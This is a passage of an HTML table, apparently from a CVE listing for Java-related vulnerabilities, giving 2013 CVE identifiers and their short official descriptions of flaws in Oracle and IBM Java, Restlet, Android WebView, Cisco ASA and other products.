		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5512">CVE-2013-5512</a></td>
		<td valign="top">Race condition in the HTTP Deep Packet Inspection (DPI) feature in Cisco Adaptive Security Appliance (ASA) Software 8.2.x before 8.2(5.46), 8.3.x before 8.3(2.39), 8.4.x before 8.4(5.5), 8.5.x before 8.5(1.18), 8.6.x before 8.6(1.12), 8.7.x before 8.7(1.4), 9.0.x before 9.0(1.4), and 9.1.x before 9.1(1.2), in certain conditions involving the spoof-server option or ActiveX or Java response inspection, allows remote attackers to cause a denial of service (device reload) via a crafted HTTP response, aka Bug ID CSCud37992.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5458">CVE-2013-5458</a></td>
		<td valign="top">Unspecified vulnerability in IBM Java SDK 7.0.0 before SR6 allows remote attackers to execute arbitrary code via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5457">CVE-2013-5457</a></td>
		<td valign="top">Unspecified vulnerability in IBM Java SDK 7.0.0 before SR6, 6.0.1 before SR7, and 6.0.0 before SR15 allows remote attackers to execute arbitrary code via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5456">CVE-2013-5456</a></td>
		<td valign="top">The com.ibm.rmi.io.SunSerializableFactory class in IBM Java SDK 7.0.0 before SR6 allows remote attackers to bypass a sandbox protection mechanism and execute arbitrary code via vectors related to deserialization inside the AccessController doPrivileged block.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5391">CVE-2013-5391</a></td>
		<td valign="top">IBM Worklight Consumer and Enterprise Editions 5.0.x before 5.0.6 Fix Pack 2 and 6.0.x before 6.0.0 Fix Pack 2, and Mobile Foundation Consumer and Enterprise Editions 5.0.x before 5.0.6 Fix Pack 2 and 6.0.0 Fix Pack 2 make it easier for attackers to defeat cryptographic protection mechanisms by leveraging improper initialization of the pseudo random number generator (PRNG) in Android and use of the Java Cryptography Architecture (JCA) by a Worklight program. IBM X-Force ID: 87128.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-5375">CVE-2013-5375</a></td>
		<td valign="top">Unspecified vulnerability in IBM Java SDK 7.0.0 before SR6, 6.0.1 before SR7, 6.0.0 before SR15, and 5.0.0 before SR16 FP4 allows remote attackers to access restricted classes via unspecified vectors related to XML and XSL.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-4820">CVE-2013-4820</a></td>
		<td valign="top">Unspecified vulnerability in HP IceWall SSO 8.0 through 10.0, IceWall SSO Agent Option 8.0 through 10.0, IceWall SSO Smart Device Option 10.0, IceWall SSO SAML2 Agent Option 8.0, IceWall SSO JAVA Agent Library 8.0 through 10.0, IceWall Federation Agent 3.0, and IceWall File Manager 3.0 through SP4 allows remote authenticated users to obtain sensitive information via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-4710">CVE-2013-4710</a></td>
		<td valign="top">Android 3.0 through 4.1.x on Disney Mobile, eAccess, KDDI, NTT DOCOMO, SoftBank, and other devices does not properly implement the WebView class, which allows remote attackers to execute arbitrary methods of Java objects or cause a denial of service (reboot) via a crafted web page, as demonstrated by use of the WebView.addJavascriptInterface method, a related issue to CVE-2012-6636.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-4578">CVE-2013-4578</a></td>
		<td valign="top">jarsigner in OpenJDK and Oracle Java SE before 7u51 allows remote attackers to bypass a code-signing protection mechanism and inject unsigned bytecode into a signed JAR file by leveraging improper file validation.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-4517">CVE-2013-4517</a></td>
		<td valign="top">Apache Santuario XML Security for Java before 1.5.6, when applying Transforms, allows remote attackers to cause a denial of service (memory consumption) via crafted Document Type Definitions (DTDs), related to signatures.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-4378">CVE-2013-4378</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in HtmlSessionInformationsReport.java in JavaMelody 1.46 and earlier allows remote attackers to inject arbitrary web script or HTML via a crafted X-Forwarded-For header.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-4271">CVE-2013-4271</a></td>
		<td valign="top">The default configuration of the ObjectRepresentation class in Restlet before 2.1.4 deserializes objects from untrusted sources, which allows remote attackers to execute arbitrary Java code via a serialized object, a different vulnerability than CVE-2013-4221.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-4221">CVE-2013-4221</a></td>
		<td valign="top">The default configuration of the ObjectRepresentation class in Restlet before 2.1.4 deserializes objects from untrusted sources using the Java XMLDecoder, which allows remote attackers to execute arbitrary Java code via crafted XML.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-4041">CVE-2013-4041</a></td>
		<td valign="top">Unspecified vulnerability in IBM Java SDK 5.0.0 before SR16 FP4, 7.0.0 before SR6, 6.0.1 before SR7, and 6.0.0 before SR15 allows remote attackers to access restricted classes via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-4002">CVE-2013-4002</a></td>
		<td valign="top">XMLscanner.java in Apache Xerces2 Java Parser before 2.12.0, as used in the Java Runtime Environment (JRE) in IBM Java 5.0 before 5.0 SR16-FP3, 6 before 6 SR14, 6.0.1 before 6.0.1 SR6, and 7 before 7 SR5 as well as Oracle Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, JRockit R28.2.8 and earlier, JRockit R27.7.6 and earlier, Java SE Embedded 7u40 and earlier, and possibly other products allows remote attackers to cause a denial of service via vectors related to XML attribute names.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3829">CVE-2013-3829</a></td>
		<td valign="top">Unspecified vulnerability in the Java SE, Java SE Embedded component in Oracle Java SE Java SE 7u40 and earlier, Java SE 6u60 and earlier, Java SE 5.0u51 and earlier, and Java SE Embedded 7u40 and earlier allows remote attackers to affect confidentiality and integrity via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3827">CVE-2013-3827</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle GlassFish Server component in Oracle Fusion Middleware 2.1.1, 3.0.1, and 3.1.2; the Oracle JDeveloper component in Oracle Fusion Middleware 11.1.2.3.0, 11.1.2.4.0, and 12.1.2.0.0; and the Oracle WebLogic Server component in Oracle Fusion Middleware 10.3.6.0 and 12.1.1 allows remote attackers to affect confidentiality via unknown vectors related to Java Server Faces or Web Container.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3744">CVE-2013-3744</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier allows remote attackers to affect integrity via unknown vectors related to Deployment, a different vulnerability than CVE-2013-2400.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3743">CVE-2013-3743</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 6 Update 45 and earlier and 5.0 Update 45 and earlier allows remote attackers to affect confidentiality, integrity, and availability via vectors related to AWT.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3646">CVE-2013-3646</a></td>
		<td valign="top">The Cybozu Live application before 2.0.1 for Android allows remote attackers to execute arbitrary Java methods, and obtain sensitive information or execute arbitrary commands, via a crafted web site. NOTE: this vulnerability exists because of a CVE-2012-4008 regression.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3388">CVE-2013-3388</a></td>
		<td valign="top">Cisco Prime Central for Hosted Collaboration Solution (HCS) Assurance 8.6 and 9.x before 9.2(1) allows remote attackers to cause a denial of service (memory consumption) via a flood of TCP packets to port 44444, aka Bug ID CSCtz92776.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3274">CVE-2013-3274</a></td>
		<td valign="top">EMC Avamar Server and Avamar Virtual Edition before 7.0 on Data Store Gen3, Gen4, and Gen4s platforms do not properly determine authorization for calls to Java RMI methods, which allows remote authenticated users to execute arbitrary code via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3012">CVE-2013-3012</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in IBM Java 1.4.2 before 1.4.2 SR13-FP18, 5.0 before 5.0 SR16-FP3, 6 before 6 SR14, 6.0.1 before 6.0.1 SR6, and 7 before 7 SR5 allows remote attackers to affect confidentiality, availability, and integrity via unknown vectors, a different vulnerability than CVE-2013-3009 and CVE-2013-3011.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3011">CVE-2013-3011</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in IBM Java 1.4.2 before 1.4.2 SR13-FP18, 5.0 before 5.0 SR16-FP3, 6 before 6 SR14, 6.0.1 before 6.0.1 SR6, and 7 before 7 SR5 allows remote attackers to affect confidentiality, availability, and integrity via unknown vectors, a different vulnerability than CVE-2013-3009 and CVE-2013-3012.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3010">CVE-2013-3010</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in IBM Java 6.0.1 before 6.0.1 SR6 and 7 before 7 SR5 allows remote attackers to affect confidentiality, availability, and integrity via unknown vectors, a different vulnerability than CVE-2013-3007.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3009">CVE-2013-3009</a></td>
		<td valign="top">The com.ibm.CORBA.iiop.ClientDelegate class in IBM Java 1.4.2 before 1.4.2 SR13-FP18, 5.0 before 5.0 SR16-FP3, 6 before 6 SR14, 6.0.1 before 6.0.1 SR6, and 7 before 7 SR5 improperly exposes the invoke method of the java.lang.reflect.Method class, which allows remote attackers to call setSecurityManager and bypass a sandbox protection mechanism via vectors related to the AccessController doPrivileged block.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3008">CVE-2013-3008</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in IBM Java 7 before 7 SR5 allows remote attackers to affect confidentiality, availability, and integrity via unknown vectors, a different vulnerability than CVE-2013-3006.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3007">CVE-2013-3007</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in IBM Java 6.0.1 before 6.0.1 SR6 and 7 before 7 SR5 allows remote attackers to affect confidentiality, availability, and integrity via unknown vectors, a different vulnerability than CVE-2013-3006.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3006">CVE-2013-3006</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in IBM Java 7 before 7 SR5 allows remote attackers to affect confidentiality, availability, and integrity via unknown vectors, a different vulnerability than CVE-2013-3008.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-3003">CVE-2013-3003</a></td>
		<td valign="top">Unspecified vulnerability in SOAP Gateway in IBM IMS Enterprise Suite 1.1, 2.1, and 2.2 allows remote authenticated users to execute arbitrary commands via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2599">CVE-2013-2599</a></td>
		<td valign="top">A certain Qualcomm Innovation Center (QuIC) patch to the NativeDaemonConnector class in services/java/com/android/server/NativeDaemonConnector.java in Code Aurora Forum (CAF) releases of Android 4.1.x through 4.3.x enables debug logging, which allows attackers to obtain sensitive disk-encryption passwords via a logcat call.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2473">CVE-2013-2473</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to "Incorrect ByteBandedRaster size checks" in 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2472">CVE-2013-2472</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to "Incorrect ShortBandedRaster size checks" in 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2471">CVE-2013-2471</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to "Incorrect IntegerComponentRaster size checks."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2470">CVE-2013-2470</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to "ImagingLib byte lookup processing."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2469">CVE-2013-2469</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to "Incorrect image layout verification" in 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2468">CVE-2013-2468</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier and 6 Update 45 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-2442 and CVE-2013-2466.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2467">CVE-2013-2467</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 5.0 Update 45 and earlier allows local users to affect confidentiality, integrity, and availability via unknown vectors related to the Java installer.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2466">CVE-2013-2466</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier and 6 Update 45 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2013-2442 and CVE-2013-2468.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2465">CVE-2013-2465</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to "Incorrect image channel verification" in 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2464">CVE-2013-2464</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D, a different vulnerability than CVE-2013-2463, CVE-2013-2465, CVE-2013-2469, CVE-2013-2470, CVE-2013-2471, CVE-2013-2472, and CVE-2013-2473.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2463">CVE-2013-2463</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to "Incorrect image attribute verification" in 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2462">CVE-2013-2462</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2461">CVE-2013-2461</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier and 6 Update 45 and earlier; the Oracle JRockit component in Oracle Fusion Middleware R27.7.5 and earlier and R28.2.7 and earlier; and OpenJDK 7 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Libraries.  NOTE: the previous information is from the June and July 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass verification of XML signatures via vectors related to a "Missing check for [a] valid DOMCanonicalizationMethod canonicalization algorithm."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2460">CVE-2013-2460</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Serviceability.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to "insufficient access checks" in the tracing component.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2459">CVE-2013-2459</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via vectors related to AWT.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to "integer overflow checks."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2458">CVE-2013-2458</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality and integrity via unknown vectors related to Libraries.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via "an error related to method handles."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2457">CVE-2013-2457</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect integrity via vectors related to JMX.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is due to an incorrect implementation of "certain class checks" that allows remote attackers to bypass intended class restrictions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2456">CVE-2013-2456</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality via unknown vectors related to Serialization.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to improper access checks for subclasses in the ObjectOutputStream class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2455">CVE-2013-2455</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality via unknown vectors related to Libraries, a different vulnerability than CVE-2013-2443 and CVE-2013-2452.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to incorrect access checks by the (1) getEnclosingClass, (2) getEnclosingMethod, and (3) getEnclosingConstructor methods.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2454">CVE-2013-2454</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality and integrity via vectors related to JDBC.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue does not properly restrict access to certain class packages in the SerialJavaObject class, which allows remote attackers to bypass the Java sandbox.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2453">CVE-2013-2453</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier and 6 Update 45 and earlier allows remote attackers to affect integrity via vectors related to JMX.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is due to a missing check for "package access" by the MBeanServer Introspector.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2452">CVE-2013-2452</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality via unknown vectors related to Libraries, a different vulnerability than CVE-2013-2443 and CVE-2013-2455.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to "network address handling in virtual machine identifiers" and the lack of "unique and unpredictable IDs" in the java.rmi.dgc.VMID class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2451">CVE-2013-2451</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier and 6 Update 45 and earlier, and OpenJDK 7, allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Networking.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to improper enforcement of exclusive port binds when running on Windows, which allows attackers to bind to ports that are already in use.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2450">CVE-2013-2450</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect availability via unknown vectors related to Serialization.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to improper handling of circular references in ObjectStreamClass.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2449">CVE-2013-2449</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality via unknown vectors related to Libraries.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue is related to GnomeFileTypeDetector and a missing check for read permissions for a path.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2448">CVE-2013-2448</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Sound.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to insufficient "access restrictions" and "robustness of sound classes."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2447">CVE-2013-2447</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality via unknown vectors related to Networking.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to obtain a socket's local address via vectors involving inconsistencies between Socket.getLocalAddress and InetAddress.getLocalHost.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2446">CVE-2013-2446</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect confidentiality via vectors related to CORBA. NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue does not properly enforce access restrictions for CORBA output streams.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2445">CVE-2013-2445</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier, and OpenJDK 7, allows remote attackers to affect availability via unknown vectors related to Hotspot.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue allows remote attackers to bypass the Java sandbox via vectors related to "handling of memory allocation errors."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2444">CVE-2013-2444</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 21 and earlier, 6 Update 45 and earlier, and 5.0 Update 45 and earlier; JavaFX 2.2.21 and earlier; and OpenJDK 7 allows remote attackers to affect availability via vectors related to AWT.  NOTE: the previous information is from the June 2013 CPU. Oracle has not commented on claims from another vendor that this issue does not "properly manage and restrict certain resources related to the processing of fonts," possibly involving temporary files.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2013-2443">CVE-2013-2443</a></td>
